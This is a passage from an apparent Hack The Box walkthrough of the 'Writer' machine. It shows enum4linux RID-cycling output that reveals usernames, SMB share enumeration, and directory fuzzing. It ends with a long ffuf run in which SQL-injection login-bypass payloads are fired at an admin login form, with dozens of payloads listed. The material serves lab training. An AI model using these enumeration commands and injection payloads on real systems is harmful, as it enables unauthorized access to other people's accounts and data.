S-1-5-21-1663171886-1921258872-720408159-505 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-506 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-507 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-508 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-509 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-510 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-511 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-512 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-513 WRITER\None (Domain Group)
S-1-5-21-1663171886-1921258872-720408159-514 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-515 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-516 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-517 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-518 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-519 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-520 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-521 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-522 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-523 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-524 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-525 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-526 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-527 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-528 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-529 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-530 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-531 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-532 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-533 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-534 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-535 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-536 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-537 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-538 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-539 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-540 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-541 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-542 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-543 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-544 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-545 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-546 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-547 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-548 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-549 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-550 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)
S-1-5-21-1663171886-1921258872-720408159-1001 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1002 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1003 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1004 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1005 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1006 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1007 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1008 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1009 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1010 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1011 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1012 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1013 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1014 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1015 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1016 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1017 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1018 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1019 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1020 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1021 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1022 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1023 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1024 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1025 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1026 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1027 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1028 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1029 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1030 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1031 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1032 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1033 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1034 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1035 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1036 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1037 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1038 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1039 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1040 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1041 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1042 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1043 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1044 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1045 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1046 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1047 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1048 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1049 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kyle (Local User)
S-1-22-1-1001 Unix User\john (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)

 ============================================= 
|    Getting printer info for 10.10.11.101    |
 ============================================= 
No printers returned.


enum4linux complete on Sun Aug  1 02:15:46 2021
```

We have tons of information.
Especially the username using RID Cycling So let's create a user.txt

``` bash
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# cat user.txt 
kyle
john
nobody
```

#### smbmap

``` bash
kali@kali:~/HackTheBox/Writer$ smbmap -u '' -p '' -R -H 10.10.11.101
[+] IP: 10.10.11.101:445        Name: 10.10.11.101                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        writer2_project                                         NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
```

Looks like annoymous login is no good as we can read any shares.

#### WEB
#### Visiting Website

Visiting the website it looks like a normal blog website

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2047.jpg)

At the Bottom you can see a refference to writer.htb so let's add it in /etc/hosts probably this is not required but it's better to be safe.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2048.jpg)

#### Directory Fuzzing

``` bash
kali@kali:~/HackTheBox/Writer$ ffuf -u http://10.10.11.101/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

about                   [Status: 200, Size: 3522, Words: 250, Lines: 75]
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
contact                 [Status: 200, Size: 4899, Words: 242, Lines: 110]
dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
static                  [Status: 301, Size: 313, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 790 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

Looks like we have few intresting directories.
let's first visit administrative.

#### Crawling through the directories

Looks like a normal login page.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2049.jpg)

/dashboard redirects to the homepage and /about has nothing intresting.
/contact has the form looks like a dead form which requests with the get request but give 404 response.

So the only good enpoint is the /administrative
we have the user so we can spray the password but before that let's see if it has any sql injections.

#### Sql-Injection

so I tried doing some basic sqlinjection payload at the login form.

``` bash
kali@kali:~/HackTheBox/Writer$ cat r.txt 
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=UNAME&password=PASS
```

The above request is captured by the burpsuite and UNAME and PASS are the names of the values to be fuzzed.

``` bash
kali@kali:~/HackTheBox/Writer$ ffuf -X POST -request r.txt -w /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt:UNAME -w /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________
 :: Method           : POST
 :: URL              : http://writer.htb/administrative
 :: Wordlist         : UNAME: /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt
 :: Wordlist         : PASS: /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Referer: http://writer.htb/administrative
 :: Header           : Host: writer.htb
 :: Header           : Origin: http://writer.htb
 :: Header           : Connection: close
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Data             : uname=UNAME&password=PASS

 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 790
________________________________________________


[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'or 1=1 or ''='

[2K    * UNAME: 'or 1=1 or ''='

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin' or 1=1#

[2K    * PASS: admin' or 1=1#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin' #

[2K    * PASS: admin' #

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 0=0 #

[2K    * PASS: ' or 0=0 #

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: admin' or '1'='1'#

[2K    * UNAME: admin' or '1'='1'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 1=1;#

[2K    * PASS: ' or 1=1;#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or         0=0 #

[2K    * PASS: ' or         0=0 #

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 1=1 LIMIT 1;#

[2K    * PASS: ' or 1=1 LIMIT 1;#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: ' or '1'='1'#

[2K    * UNAME: ' or '1'='1'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' OR 'x'='x'#;

[2K    * PASS: ' OR 'x'='x'#;

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: admin' or '1'='1

[2K    * UNAME: admin' or '1'='1

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin'or 1=1 or ''='

[2K    * PASS: admin'or 1=1 or ''='

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: ' or 1=1#

[2K    * PASS: ' or 1=1#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '=' 'or' and '=' 'or'

[2K    * PASS: '=' 'or' and '=' 'or'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '-''-- 2

[2K    * PASS: '-''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '=''#

[2K    * PASS: '=''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '-''#

[2K    * UNAME: '-''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 0'<'2'-- 2

[2K    * PASS: 0'<'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 0'<'2'#

[2K    * UNAME: 0'<'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '^''-- 2

[2K    * PASS: '^''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '=''-- 2

[2K    * PASS: '=''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '*''#

[2K    * PASS: '*''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '^''#

[2K    * UNAME: '^''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '*''-- 2

[2K    * PASS: '*''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)#

[2K    * PASS: 'oR(2)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2=2#

[2K    * PASS: 'oR/**/2=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR'2'='2'oR'

[2K    * UNAME: 'oR'2'='2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2 oR'

[2K    * PASS: 'oR 2 oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)-- 2

[2K    * PASS: 'oR(2)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)oR'

[2K    * PASS: 'oR(2)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'-- 2

[2K    * PASS: 'oR'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR true#

[2K    * PASS: 'oR true#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(true)-- 2

[2K    * PASS: 'oR(true)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2' LimIT 1-- 2

[2K    * PASS: 'oR'2'='2' LimIT 1-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2=2/**/oR'

[2K    * PASS: 'oR/**/2=2/**/oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR true-- 2

[2K    * PASS: 'oR true-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'#

[2K    * PASS: 'oR'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2'oR'

[2K    * PASS: 'oR'2'='2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR'2'='2'-- 2

[2K    * UNAME: 'oR'2'='2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR(2)=2#

[2K    * UNAME: 'oR(2)=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2-- 2

[2K    * PASS: 'oR 2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'oR'

[2K    * PASS: 'oR'2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/true-- 2

[2K    * PASS: 'oR/**/true-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2=2#

[2K    * PASS: 'oR 2=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(true)#

[2K    * PASS: 'oR(true)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2'#

[2K    * PASS: 'oR'2'='2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR true oR'

[2K    * PASS: 'oR true oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR 2=2-- 2

[2K    * UNAME: 'oR 2=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)=2-- 2

[2K    * PASS: 'oR(2)=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2#

[2K    * PASS: 'oR/**/2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR/**/true/**/oR'

[2K    * UNAME: 'oR/**/true/**/oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/true#

[2K    * PASS: 'oR/**/true#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2=2-- 2

[2K    * PASS: 'oR/**/2=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR(2)=(2)oR'

[2K    * UNAME: 'oR(2)=(2)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2-- 2

[2K    * PASS: 'oR/**/2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2=2 oR'

[2K    * PASS: 'oR 2=2 oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2' LimIT 1#

[2K    * PASS: 'oR'2'='2' LimIT 1#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)LiKE(2)-- 2

[2K    * PASS: 'oR(2)LiKE(2)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR'2'LiKE'2'oR'

[2K    * UNAME: 'oR'2'LiKE'2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(true)oR'

[2K    * PASS: 'oR(true)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'LiKE'2'-- 2

[2K    * PASS: 'oR'2'LiKE'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2/**/oR'

[2K    * PASS: 'oR/**/2/**/oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'LiKE'2'#

[2K    * PASS: 'oR'2'LiKE'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2#

[2K    * PASS: 'oR 2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)LiKE(2)oR'

[2K    * PASS: 'oR(2)LiKE(2)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR(2)LiKE(2)#

[2K    * UNAME: 'oR(2)LiKE(2)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin'#

[2K    * PASS: admin'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: admin'-- 2

[2K    * UNAME: admin'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'||'

[2K    * PASS: '||'2'||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2-- 2

[2K    * PASS: '||2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2#

[2K    * PASS: '||2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2||'

[2K    * PASS: '||2||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2=2-- 2

[2K    * PASS: '||2=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2=2#

[2K    * PASS: '||2=2#

[32m
